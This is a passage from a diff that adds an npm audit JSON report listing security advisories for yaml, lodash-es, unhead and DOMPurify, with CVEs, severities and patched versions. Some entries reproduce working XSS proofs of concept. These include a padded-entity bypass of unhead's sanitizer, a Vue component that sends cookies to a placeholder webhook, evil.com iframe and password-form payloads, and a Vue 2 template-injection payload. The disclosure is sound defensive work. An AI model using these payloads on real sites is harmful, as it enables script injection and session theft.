|\n\nDepth threshold on yaml 2.8.2:\n\n| Nesting Depth | Input Size | Result |\n|---|---|---|\n| 500 | 1,001 B | Parses successfully |\n| 1,000 | 2,001 B | RangeError (threshold varies by stack size) |\n| 5,000 | 10,001 B | RangeError |",
+      "reported_by": null,
+      "title": "yaml is vulnerable to Stack Overflow via deeply nested YAML collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33532"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "yaml",
+      "vulnerable_versions": ">=2.0.0 <2.8.3",
+      "github_advisory_id": "GHSA-48c2-rrv3-qjmp",
+      "recommendation": "Upgrade to version 2.8.3 or later",
+      "patched_versions": ">=2.8.3",
+      "updated": "2026-03-27T21:34:54.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-48c2-rrv3-qjmp"
+    },
+    "1115805": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [
+            ".>@rspress/core>lodash-es"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115805,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4800"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash-es",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1115809": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [
+            ".>@rspress/core>lodash-es"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh\n- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2950\n- https://github.com/advisories/GHSA-f23m-r3pf-42rh",
+      "created": "2026-04-01T23:50:27.000Z",
+      "id": 1115809,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2950"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash-es",
+      "vulnerable_versions": "<=4.17.23",
+      "github_advisory_id": "GHSA-f23m-r3pf-42rh",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:50:28.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-f23m-r3pf-42rh"
+    },
+    "1116373": {
+      "findings": [
+        {
+          "version": "2.1.12",
+          "paths": [
+            ".>@rspress/core>@unhead/react>unhead"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/unjs/unhead/security/advisories/GHSA-95h2-gj7x-gx9w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39315\n- https://github.com/unjs/unhead/commit/961ea781e091853812ffe17f8cda17105d2d2299\n- https://github.com/unjs/unhead/releases/tag/v2.1.13\n- https://github.com/advisories/GHSA-95h2-gj7x-gx9w",
+      "created": "2026-04-09T20:28:05.000Z",
+      "id": 1116373,
+      "npm_advisory_id": null,
+      "overview": "##EVIDENCE\n\n<img width=\"1900\" height=\"855\" alt=\"Screenshot_2026-03-25_090729\" src=\"https://github.com/user-attachments/assets/3da93464-1caf-46ca-818f-46f8fe32ab50\" />\n<img width=\"1919\" height=\"947\" alt=\"Screenshot_2026-03-25_090715\" src=\"https://github.com/user-attachments/assets/b27b1fc3-fa89-4864-99c9-4e6cff9a4e40\" />\n<img width=\"1918\" height=\"925\" alt=\"Screenshot_2026-03-25_090759\" src=\"https://github.com/user-attachments/assets/9b8c94fa-d4f7-412e-ba14-214bc4103f4c\" />\n<img width=\"1912\" height=\"812\" alt=\"Screenshot_2026-03-25_090824\" src=\"https://github.com/user-attachments/assets/3a4e1002-8811-453a-b08c-dfd1e42ebcf0\" />\n<img width=\"1846\" height=\"409\" alt=\"Screenshot_2026-03-22_090617\" src=\"https://github.com/user-attachments/assets/9a595e13-ed18-464a-9d1a-0bb71dec96c9\" />\n\n\n| **Disclosed to Vercel H1** | 2026-03-22 (no response after 12 days) |\n| **Cross-reported here** | 2026-04-03 |\n\n---\n\n## Summary\n\n`useHeadSafe()` is the composable that Nuxt's own documentation explicitly recommends\nfor rendering user-supplied content in `<head>` safely. Internally, the\n`hasDangerousProtocol()` function in `packages/unhead/src/plugins/safe.ts` decodes\nHTML entities before checking for blocked URI schemes (`javascript:`, `data:`,\n`vbscript:`). The decoder uses two regular expressions with fixed-width digit caps:\n\n```js\n// Current — vulnerable\nconst HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi\nconst HtmlEntityDec = /&#(\\d{1,7});?/g\n```\n\nThe HTML5 specification imposes **no limit** on leading zeros in numeric character\nreferences. Both of the following are valid, spec-compliant encodings of `:` (U+003A):\n\n- `&#0000000058;` — 10 decimal digits, exceeds the `\\d{1,7}` cap\n- `&#x000003A;` — 7 hex digits, exceeds the `[0-9a-f]{1,6}` cap\n\nWhen a padded entity exceeds the regex digit cap, the decoder silently skips it. The\nundecoded string is then passed to `startsWith('javascript:')`, which does not match.\n`makeTagSafe()` writes the raw value directly into SSR HTML output. The browser's HTML\nparser decodes the padded entity natively and constructs the blocked URI.\n\n> **Note:** This is a separate, distinct issue from CVE-2026-31860 / GHSA-g5xx-pwrp-g3fv,\n> which was an attribute *key* injection via the `data-*` prefix. This finding targets\n> the attribute *value* decoder — a different code path with a different root cause and\n> a different fix.\n\n---\n\n## Root Cause Analysis\n\n### Vulnerable code (`packages/unhead/src/plugins/safe.ts`, lines 10–11)\n\n```js\nconst HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi   // cap: 6 hex digits max\nconst HtmlEntityDec = /&#(\\d{1,7});?/g             // cap: 7 decimal digits max\n```\n\n### Why the bypass works\n\nThe HTML5 parser specification ([§ Numeric character reference end state][html5-spec])\nstates that leading zeros in numeric character references are valid and the number of\ndigits is unbounded. A conformant browser will decode `&#x000003A;` as `:` regardless\nof the number of leading zeros.\n\nBecause the regex caps are lower than the digit counts an attacker can supply, the\nentity match fails silently. The raw padded string (`java&#0000000058;script:alert(1)`)\nis passed unchanged to the scheme check. `startsWith('javascript:')` returns `false`,\nand the value is rendered into SSR output verbatim. The browser then decodes the entity\nand the blocked scheme is present in the live DOM.\n\n---\n\n## Steps to Reproduce\n\n### Environment\n\n- **Nuxt:** 4.x (current)\n- **unhead:** 2.1.12 (current at time of report)\n- **Node:** 20 LTS\n- **Chrome:** 146+\n\n### Step 1 — Create a fresh Nuxt 4 project\n\n```bash\nnpx nuxi init poc\ncd poc\nnpm install\n```\n\n### Step 2 — Replace `pages/index.vue`\n\n```vue\n<template>\n  <div>\n    <h1>useHeadSafe bypass PoC</h1>\n    <p>View page source or run the curl command below.</p>\n  </div>\n</template>\n\n<script setup>\nimport { useHeadSafe } from '#imports'\n\nuseHeadSafe({\n  link: [\n    // 10-digit decimal padding — exceeds \\d{1,7} cap\n    { rel: 'stylesheet', href: 'java&#0000000058;script:alert(1)' },\n\n    // 7-digit hex padding — exceeds [0-9a-f]{1,6} cap\n    { rel: 'icon', href: 'data&#x000003A;text/html,<script>alert(document.cookie)<\\/script>' }\n  ]\n})\n</script>\n```\n\n### Step 3 — Start the dev server and inspect SSR output\n\n```bash\nnpm run dev\n```\n\nIn a separate terminal:\n\n```bash\ncurl -s http://localhost:3000 | grep '<link'\n```\n\n### Expected result (safe)\n\nTags stripped entirely, or schemes rewritten to safe placeholder values.\n\n### Actual result (vulnerable)\n\n```html\n<link href=\"java&#0000000058;script:alert(1)\" rel=\"stylesheet\">\n<link href=\"data&#x000003A;text/html,<script>alert(document.cookie)<\\/script>\" rel=\"icon\">\n```\n\nBoth `javascript:` and `data:` — explicitly enumerated in the `hasDangerousProtocol()`\nblocklist — are present in server-rendered HTML. The browser decodes the padded entities\nnatively on load.\n\n---\n\n## Confirmed Execution Path (data: URI via iframe, Chrome 146+)\n\nImmediate script execution from `<link>` tags does not occur automatically — browsers\ndo not create a browsing context from `<link href>`. The exploitability of this bypass\ntherefore depends on whether downstream application code consumes `<link>` href values.\n\nThis is a **common pattern** in real-world Nuxt applications:\n\n- Head management libraries that hydrate or re-process `<link>` tags on the client\n- SEO and analytics scripts that read canonical or icon link values\n- Application features that preview, validate, or forward link URLs into iframes\n- Developer tooling that loads icon URLs for thumbnail generation\n\nChrome 146+ permits `data:` URIs loaded into iframes even though top-level `data:`\nnavigation has been blocked since Chrome 60. The following snippet — representative\nof any downstream consumer that forwards `<link href>` into an iframe — triggers\nconfirmed script execution:\n\n```js\n// Simulates downstream head-management or SEO utility reading a <link> href\nconst link = document.querySelector('link[rel=\"icon\"]');\nif (link) {\n  const iframe = document.createElement('iframe');\n  iframe.src = link.href; // browser decodes &#x000003A; → ':', constructs data: URI\n  document.body.appendChild(iframe); // alert() fires\n}\n```\n\n### Full PoC with cookie exfiltration beacon\n\n> Replace `ADD-YOUR-WEBHOOK-URL-HERE` with a webhook.site URL before running.\n\n```vue\n<template>\n  <div>\n    <h1>useHeadSafe padded entity bypass — full PoC</h1>\n    <p><strong>Dummy cookie:</strong> <code id=\"cookie-display\">Loading…</code></p>\n  </div>\n</template>\n\n<script setup>\nimport { useHeadSafe } from '#imports'\nimport { onMounted } from 'vue'\n\nonMounted(() => {\n  document.cookie = 'session=super-secret-token-12345; path=/; SameSite=None'\n  const el = document.getElementById('cookie-display')\n  if (el) el.textContent = document.cookie\n\n  // Simulate downstream consumption: load the bypassed icon href into an iframe\n  const link = document.querySelector('link[rel=\"icon\"]')\n  if (link) {\n    const iframe = document.createElement('iframe')\n    iframe.src = link.href\n    iframe.style.cssText = 'width:700px;height:400px;border:3px solid red;margin-top:20px'\n    document.body.appendChild(iframe)\n  }\n})\n\nconst webhook = 'https://ADD-YOUR-WEBHOOK-URL-HERE'\n\nuseHeadSafe({\n  link: [\n    {\n      rel: 'icon',\n      href: `data&#x000003A;text/html;base64,${btoa(`\n        <!DOCTYPE html><html><body><script>\n          alert('XSS via useHeadSafe padded entity bypass');\n          new Image().src = '${webhook}?d=' + encodeURIComponent(JSON.stringify({\n            finding: 'useHeadSafe hasDangerousProtocol bypass',\n            cookie: document.cookie || 'session=super-secret-token-12345 (dummy)',\n            origin: location.origin,\n            ts: Date.now()\n          }));\n        <\\/script></body></html>\n      `)}`\n    }\n  ]\n})\n</script>\n```\n\n**Observed result:**\n\n1. `alert()` fires from inside the iframe's `data:` document context\n2. Webhook receives a GET request with the cookie value and origin in the query string\n3. Page source confirms `&#x000003A;` is present unescaped in the SSR-rendered `<link>` tag\n\n> All testing was performed against a local Nuxt development environment on a personal\n> machine. Cookie values are dummy data. No production systems were accessed or targeted.\n\n---\n\n## Impact\n\n### 1. Broken security contract\n\nDevelopers who follow Nuxt's own documentation and use `useHeadSafe()` for untrusted\nuser input have no reliable protection against `javascript:`, `data:`, or `vbscript:`\nscheme injection when that input contains leading-zero padded numeric character\nreferences. The documented guarantee is silently violated.\n\n### 2. Confirmed data: URI escape to SSR output\n\nA fully valid `data:text/html` URI now reaches server-rendered HTML. In applications\nwhere any downstream code reads and loads `<link href>` values (head management\nutilities, SEO tooling, icon preview features), this is **confirmed XSS** — the payload\npersists in SSR output and executes for every visitor whose browser triggers the\ndownstream consumption path.\n\n### 3. Forward exploitability\n\nIf any navigation-context attribute (e.g. `<a href>`, `<form action>`) is added to the\nsafe attribute whitelist in a future release, this bypass produces **immediately\nexploitable stored XSS** with no additional attacker effort, because the end-to-end\nbypass already works today.\n\n---\n\n## Suggested Fix\n\nRemove the fixed digit caps from both entity regexes. The downstream `safeFromCodePoint()`\nfunction already validates that decoded codepoints fall within the valid Unicode range\n(`> 0x10FFFF || < 0 || isNaN → ''`), so unbounded digit matching introduces no new\nattack surface — it only ensures that all spec-compliant encodings of a codepoint are\ndecoded before the scheme check runs.\n\n```diff\n- const HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi\n- const HtmlEntityDec = /&#(\\d{1,7});?/g\n+ const HtmlEntityHex = /&#x([0-9a-f]+);?/gi\n+ const HtmlEntityDec = /&#(\\d+);?/g\n```\n\n**File:** `packages/unhead/src/plugins/safe.ts`, lines 10–11\n\nThis is a minimal, low-risk change. No other code in the call path requires modification.\n\n---\n\n## Weaknesses\n\n| CWE | Description |\n|---|---|\n| **CWE-184** | Incomplete List of Disallowed Inputs |\n| **CWE-116** | Improper Encoding or Escaping of Output |\n| **CWE-20** | Improper Input Validation |\n\n---\n\n## References\n\n| Source | Link |\n|---|---|\n| HTML5 spec — leading zeros valid and unbounded | https://html.spec.whatwg.org/multipage/syntax.html#numeric-character-reference-end-state |\n| GHSA-46fp-8f5p-pf2c — Loofah `allowed_uri?` bypass (same root cause, accepted CVE) | https://github.com/advisories/GHSA-46fp-8f5p-pf2c |\n| CVE-2026-26022 — Gogs stored XSS via `data:` URI sanitizer bypass (same class) | https://advisories.gitlab.com/pkg/golang/gogs.io/gogs/CVE-2026-26022/ |\n| OWASP XSS Filter Evasion — leading-zero entity encoding | https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html |\n| Chrome: `data:` URIs blocked for top-level navigation since Chrome 60; permitted in iframes | https://developer.chrome.com/blog/data-url-deprecations |\n| Prior unhead advisory (different code path, context only) | GHSA-g5xx-pwrp-g3fv / CVE-2026-31860 |\n| Affected file | https://github.com/unjs/unhead/blob/main/packages/unhead/src/plugins/safe.ts |",
+      "reported_by": null,
+      "title": "Unhead has a hasDangerousProtocol() bypass via leading-zero padded HTML entities in useHeadSafe()",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39315"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "unhead",
+      "vulnerable_versions": "<2.1.13",
+      "github_advisory_id": "GHSA-95h2-gj7x-gx9w",
+      "recommendation": "Upgrade to version 2.1.13 or later",
+      "patched_versions": ">=2.1.13",
+      "updated": "2026-04-09T20:28:06.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-184"
+      ],
+      "url": "https://github.com/advisories/GHSA-95h2-gj7x-gx9w"
+    },
+    "1116663": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp\n- https://github.com/advisories/GHSA-39q2-94rc-95cp",
+      "created": "2026-04-16T00:46:35.000Z",
+      "id": 1116663,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) && (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept — `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior — forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
+      "reported_by": null,
+      "title": "DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.3.3",
+      "github_advisory_id": "GHSA-39q2-94rc-95cp",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-16T00:46:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-783"
+      ],
+      "url": "https://github.com/advisories/GHSA-39q2-94rc-95cp"
+    },
+    "1117138": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41240\n- https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80\n- https://github.com/advisories/GHSA-h7mw-gpvr-xq4m",
+      "created": "2026-04-22T17:34:17.000Z",
+      "id": 1117138,
+      "npm_advisory_id": null,
+      "overview": "There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.\n\nCommit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:\n\n    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */\n    if (FORBID_ATTR[lcName]) {\n      return false;\n    }\n\nThe same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:\n\n    if (\n      !(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits\n      ) &&\n      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated\n    ) {\n\nThis allows forbidden elements to survive sanitization with their attributes intact.\n\nPoC (tested against current HEAD in Node.js + jsdom):\n\n    const DOMPurify = createDOMPurify(window);\n\n    DOMPurify.sanitize(\n      '<iframe src=\"https://evil.com\"></iframe>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['iframe']\n      }\n    );\n    // Returns: '<iframe src=\"https://evil.com\"></iframe>'\n    // Expected: '' (iframe forbidden)\n\n    DOMPurify.sanitize(\n      '<form action=\"https://evil.com/steal\"><input name=password></form>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['form']\n      }\n    );\n    // Returns: '<form action=\"https://evil.com/steal\"><input name=\"password\"></form>'\n    // Expected: '<input name=\"password\">' (form forbidden)\n\nConfirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.\n\nCompare with FORBID_ATTR which correctly wins:\n\n    DOMPurify.sanitize(\n      '<p onclick=\"alert(1)\">hello</p>',\n      {\n        ADD_ATTR: function(attr) { return true; },\n        FORBID_ATTR: ['onclick']\n      }\n    );\n    // Returns: '<p>hello</p>' (onclick correctly removed)\n\nSuggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:\n\n    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */\n    if (FORBID_TAGS[tagName]) {\n      // proceed to removal logic\n    }\n\nThis requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.\n\nReporter: Koda Reef",
+      "reported_by": null,
+      "title": "DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41240"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<3.4.0",
+      "github_advisory_id": "GHSA-h7mw-gpvr-xq4m",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-27T16:32:34.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-183"
+      ],
+      "url": "https://github.com/advisories/GHSA-h7mw-gpvr-xq4m"
+    },
+    "1117139": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41239\n- https://github.com/advisories/GHSA-crv5-9vww-q3g8",
+      "created": "2026-04-22T17:32:54.000Z",
+      "id": 1117139,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n| Field | Value |\n|:------|:------|\n| **Severity** | Medium |\n| **Affected** | DOMPurify `main` at [`883ac15`](https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6), introduced in v1.0.10 ([`7fc196db`](https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec)) |\n\n`SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2.\n\n## Technical Details\n\nDOMPurify strips template expressions in two passes:\n\n1. **Per-node** — each text node is checked during the tree walk ([`purify.ts:1179-1191`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191)):\n\n```js\n// pass #1: runs on every text node during tree walk\nif (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {\n  content = currentNode.textContent;\n  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -> ' '\n  content = content.replace(ERB_EXPR, ' ');        // <%...%> -> ' '\n  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -> ' '\n  currentNode.textContent = content;\n}\n```\n\n2. **Final string scrub** — after serialization, the full HTML string is scrubbed again ([`purify.ts:1679-1683`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683)). This is the safety net that catches expressions that only form after the DOM settles.\n\nThe `RETURN_DOM` path returns before pass #2 ever runs ([`purify.ts:1637-1661`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661)):\n\n```js\n// purify.ts (simplified)\n\nif (RETURN_DOM) {\n  // ... build returnNode ...\n  return returnNode;        // <-- exits here, pass #2 never runs\n}\n\n// pass #2: only reached by string-mode callers\nif (SAFE_FOR_TEMPLATES) {\n  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');\n}\nreturn serializedHTML;\n```\n\nThe payload `{<foo></foo>{constructor.constructor('alert(1)')()}<foo></foo>}` exploits this:\n\n1. Parser creates: `TEXT(\"{\")` → `<foo>` → `TEXT(\"{payload}\")` → `<foo>` → `TEXT(\"}\")` — no single node contains `{{`, so pass #1 misses it\n2. `<foo>` is not allowed, so DOMPurify removes it but keeps surrounding text\n3. The three text nodes are now adjacent — `.outerHTML` reads them as `{{payload}}`, which Vue 2 compiles and executes\n\n## Reproduce\n\nOpen the following html in any browser and `alert(1)` pops up.\n\n```html\n<!DOCTYPE html>\n<html>\n\n<body>\n  <script src=\"https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js\"></script>\n  <script src=\"https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js\"></script>\n  <script>\n    var dirty = '<div id=\"app\">{<foo></foo>{constructor.constructor(\"alert(1)\")()}<foo></foo>}</div>';\n    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });\n    document.body.appendChild(dom.firstChild);\n    new Vue({ el: '#app' });\n  </script>\n</body>\n\n</html>\n```\n\n## Impact\n\nAny application that sanitizes attacker-controlled HTML with `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `RETURN_DOM_FRAGMENT: true`), then mounts the result into a template-evaluating framework, is vulnerable to XSS.\n\n## Recommendations\n\n### Fix\n\n`normalize()` merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both `RETURN_DOM` and `RETURN_DOM_FRAGMENT`.\n\n```diff\n     if (RETURN_DOM) {\n+      if (SAFE_FOR_TEMPLATES) {\n+        body.normalize();\n+        let html = body.innerHTML;\n+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {\n+          html = stringReplace(html, expr, ' ');\n+        });\n+        body.innerHTML = html;\n+      }\n+\n       if (RETURN_DOM_FRAGMENT) {\n         returnNode = createDocumentFragment.call(body.ownerDocument);\n```",
+      "reported_by": null,
+      "title": "DOMPurify has a SAFE_FOR_TEMPLATES bypass in RETURN_DOM mode",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41239"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=1.0.10 <3.4.0",
+      "github_advisory_id": "GHSA-crv5-9vww-q3g8",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-27T16:32:13.000Z",
+      "cvss": {
+        "score": 6.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-1289"
+      ],
+      "url": "https://github.com/advisories/GHSA-crv5-9vww-q3g8"
+    },
+    "1117140": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": [
+            ".>rspress-plugin-mermaid>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41238\n- https://github.com/advisories/GHSA-v9jr-rg53-9pgp",
+      "created": "2026-04-22T17:31:32.000Z",
+      "id": 1117140,
+      "npm_advisory_id": null,
